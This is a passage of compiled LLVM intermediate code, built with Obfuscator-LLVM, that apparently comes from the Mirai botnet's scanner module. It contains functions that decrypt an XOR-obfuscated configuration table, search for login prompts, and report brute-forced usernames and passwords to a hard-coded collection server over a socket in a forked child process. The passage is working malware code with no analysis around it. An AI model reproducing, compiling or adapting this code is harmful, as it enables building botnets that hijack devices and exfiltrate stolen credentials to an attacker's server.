  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8)
  %10 = icmp eq i32 %9, -1
  call void @table_lock_val(i8 zeroext 10)
  br i1 %10, label %11, label %18

; <label>:11:                                     ; preds = %1
  call void @table_unlock_val(i8 zeroext 9)
  %12 = call i8* @table_retrieve_val(i32 9, i32* nonnull %2)
  %13 = load i32, i32* %5, align 4
  %14 = load i32, i32* %2, align 4
  %15 = add nsw i32 %14, -1
  %16 = call i32 @util_memsearch(i8* %4, i32 %13, i8* %12, i32 %15)
  call void @table_lock_val(i8 zeroext 9)
  %17 = icmp eq i32 %16, -1
  %. = select i1 %17, i32 0, i32 %16
  br label %18

; <label>:18:                                     ; preds = %11, %1
  %.0 = phi i32 [ -1, %1 ], [ %., %11 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @report_working(i32, i16 zeroext, %struct.scanner_auth*) unnamed_addr #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  %8 = tail call i32 @fork() #10
  %9 = icmp sgt i32 %8, 0
  %10 = icmp eq i32 %8, -1
  %or.cond = or i1 %9, %10
  br i1 %or.cond, label %11, label %12

; <label>:11:                                     ; preds = %3
  ret void

; <label>:12:                                     ; preds = %3
  %13 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  tail call void @exit(i32 0) #12
  unreachable

; <label>:16:                                     ; preds = %12
  tail call void @table_unlock_val(i8 zeroext 2)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = tail call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0)) #10
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  store i32 %18, i32* %19, align 4
  %20 = tail call i8* @table_retrieve_val(i32 2, i32* null)
  %21 = bitcast i8* %20 to i16*
  %22 = load i16, i16* %21, align 2
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  tail call void @table_lock_val(i8 zeroext 2)
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %13, %struct.sockaddr* nonnull %24, i32 16) #10
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %29

; <label>:27:                                     ; preds = %16
  %28 = call i32 @close(i32 %13) #10
  call void @exit(i32 0) #12
  unreachable

; <label>:29:                                     ; preds = %16
  store i8 0, i8* %7, align 1
  %30 = call i64 @send(i32 %13, i8* nonnull %7, i64 1, i32 16384) #10
  %31 = bitcast i32* %4 to i8*
  %32 = call i64 @send(i32 %13, i8* nonnull %31, i64 4, i32 16384) #10
  %33 = bitcast i16* %5 to i8*
  %34 = call i64 @send(i32 %13, i8* nonnull %33, i64 2, i32 16384) #10
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 4
  %36 = call i64 @send(i32 %13, i8* %35, i64 1, i32 16384) #10
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 0
  %38 = load i8*, i8** %37, align 8
  %39 = load i8, i8* %35, align 4
  %40 = zext i8 %39 to i64
  %41 = call i64 @send(i32 %13, i8* %38, i64 %40, i32 16384) #10
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 5
  %43 = call i64 @send(i32 %13, i8* %42, i64 1, i32 16384) #10
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 1
  %45 = load i8*, i8** %44, align 8
  %46 = load i8, i8* %42, align 1
  %47 = zext i8 %46 to i64
  %48 = call i64 @send(i32 %13, i8* %45, i64 %47, i32 16384) #10
  %49 = call i32 @close(i32 %13) #10
  call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc signext i8 @can_consume(%struct.scanner_connection* readonly, i8* readnone, i32) unnamed_addr #5 {
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %5 = load i32, i32* %4, align 4
  %6 = sext i32 %5 to i64
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %6
  %8 = sext i32 %2 to i64
  %9 = getelementptr inbounds i8, i8* %1, i64 %8
  %10 = icmp ult i8* %9, %7
  %11 = zext i1 %10 to i8
  ret i8 %11
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i8* @deobf(i8*, i32* nocapture) unnamed_addr #0 {
  %3 = tail call i32 @util_strlen(i8* %0) #10
  store i32 %3, i32* %1, align 4
  %4 = add nsw i32 %3, 1
  %5 = sext i32 %4 to i64
  %6 = tail call noalias i8* @malloc(i64 %5) #10
  tail call void @util_memcpy(i8* %6, i8* %0, i32 %4) #10
  %7 = load i32, i32* %1, align 4
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %2
  %9 = sext i32 %7 to i64
  %min.iters.check = icmp ult i32 %7, 32
  br i1 %min.iters.check, label %scalar.ph.preheader, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph
  %n.vec = and i64 %9, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %scalar.ph.preheader, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  %10 = add nsw i64 %n.vec, -32
  %11 = lshr exact i64 %10, 5
  %12 = and i64 %11, 1
  %lcmp.mod = icmp eq i64 %12, 0
  br i1 %lcmp.mod, label %vector.body.prol.preheader, label %vector.body.prol.loopexit

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol.preheader
  %13 = bitcast i8* %6 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %13, align 1
  %14 = getelementptr i8, i8* %6, i64 16
  %15 = bitcast i8* %14 to <16 x i8>*
  %wide.load18.prol = load <16 x i8>, <16 x i8>* %15, align 1
  %16 = xor <16 x i8> %wide.load.prol, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %17 = xor <16 x i8> %wide.load18.prol, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %18 = bitcast i8* %6 to <16 x i8>*
  store <16 x i8> %16, <16 x i8>* %18, align 1
  %19 = bitcast i8* %14 to <16 x i8>*
  store <16 x i8> %17, <16 x i8>* %19, align 1
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.prol, %vector.body.preheader
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ 32, %vector.body.prol ]
  %20 = icmp eq i64 %11, 0
  br i1 %20, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.1, %vector.body ]
  %21 = getelementptr inbounds i8, i8* %6, i64 %index
  %22 = bitcast i8* %21 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %22, align 1
  %23 = getelementptr i8, i8* %21, i64 16
  %24 = bitcast i8* %23 to <16 x i8>*
  %wide.load18 = load <16 x i8>, <16 x i8>* %24, align 1
  %25 = xor <16 x i8> %wide.load, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %26 = xor <16 x i8> %wide.load18, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %27 = bitcast i8* %21 to <16 x i8>*
  store <16 x i8> %25, <16 x i8>* %27, align 1
  %28 = bitcast i8* %23 to <16 x i8>*
  store <16 x i8> %26, <16 x i8>* %28, align 1
  %index.next = add i64 %index, 32
  %29 = getelementptr inbounds i8, i8* %6, i64 %index.next
  %30 = bitcast i8* %29 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %30, align 1
  %31 = getelementptr i8, i8* %29, i64 16
  %32 = bitcast i8* %31 to <16 x i8>*
  %wide.load18.1 = load <16 x i8>, <16 x i8>* %32, align 1
  %33 = xor <16 x i8> %wide.load.1, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %34 = xor <16 x i8> %wide.load18.1, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %35 = bitcast i8* %29 to <16 x i8>*
  store <16 x i8> %33, <16 x i8>* %35, align 1
  %36 = bitcast i8* %31 to <16 x i8>*
  store <16 x i8> %34, <16 x i8>* %36, align 1
  %index.next.1 = add i64 %index, 64
  %37 = icmp eq i64 %index.next.1, %n.vec
  br i1 %37, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !14

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %9, %n.vec
  br i1 %cmp.n, label %._crit_edge, label %scalar.ph.preheader

scalar.ph.preheader:                              ; preds = %middle.block, %min.iters.checked, %.lr.ph
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph ], [ %n.vec, %middle.block ]
  br label %scalar.ph

scalar.ph:                                        ; preds = %scalar.ph.preheader, %scalar.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %scalar.ph ], [ %indvars.iv.ph, %scalar.ph.preheader ]
  %38 = getelementptr inbounds i8, i8* %6, i64 %indvars.iv
  %39 = load i8, i8* %38, align 1
  %40 = xor i8 %39, 84
  store i8 %40, i8* %38, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %41 = icmp slt i64 %indvars.iv.next, %9
  br i1 %41, label %scalar.ph, label %._crit_edge.loopexit, !llvm.loop !15

._crit_edge.loopexit:                             ; preds = %scalar.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %middle.block, %2
  ret i8* %6
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = distinct !{!4, !5, !2, !3}
!5 = !{!"llvm.loop.unroll.runtime.disable"}
!6 = distinct !{!6, !2, !3}
!7 = distinct !{!7, !5, !2, !3}
!8 = !{i32 -2146816763}
!9 = !{i32 -2146816354}
!10 = distinct !{!10, !2, !3}
!11 = distinct !{!11, !12}
!12 = !{!"llvm.loop.unroll.disable"}
!13 = distinct !{!13, !2, !3}
!14 = distinct !{!14, !2, !3}
!15 = distinct !{!15, !5, !2, !3}
